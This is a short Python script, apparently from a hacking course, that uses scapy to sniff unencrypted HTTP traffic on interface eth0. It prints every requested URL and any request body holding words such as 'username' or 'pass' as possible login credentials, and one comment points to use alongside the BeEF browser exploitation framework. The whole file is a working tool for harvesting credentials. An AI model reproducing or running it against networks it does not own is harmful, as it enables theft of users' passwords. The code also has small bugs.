#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http


#to use with https with BeEF, change port to 8080
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter= "port 80")
def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url
def get_loging_info(packet):
    if packet.haslayer(scapy.Raw):
        # use .packet.show() to see all the layers
        load = packet[scapy.Raw].load
        # check keyworlds if in load
        keywords = ["username", "user", "login", "pass", "passwords"]
        for keyword in keywords:
            if keyword in str(load):
                return load
def process_sniffed_packet(packet):
# # can check if packet have different layers
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url = get_url(packet)
        print("[+] HTTP request >> " + str(url))

        login_info = get_loging_info(packet)
        if login_info:
            print("\n\n[+] possible username/password >> " + login_info + "\n\n")



sniff("eth0")